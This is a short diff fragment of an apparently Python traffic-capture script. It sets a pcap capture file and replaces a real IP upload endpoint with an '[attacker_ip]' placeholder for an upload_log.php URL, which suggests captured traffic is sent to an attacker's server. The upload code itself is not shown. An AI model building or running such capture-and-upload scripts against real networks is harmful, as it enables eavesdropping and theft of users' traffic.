@@ -8,7 +8,7 @@ capture_dir = "./"
 capture_file = "capture.pcap"
 
 # 서버 정보
-remote_server_url = 'http://222.96.227.76:8080/upload_log.php'
+remote_server_url = 'http://[attacker_ip]/upload_log.php'
 
 def capture_traffic():
     global capture_dir, capture_file
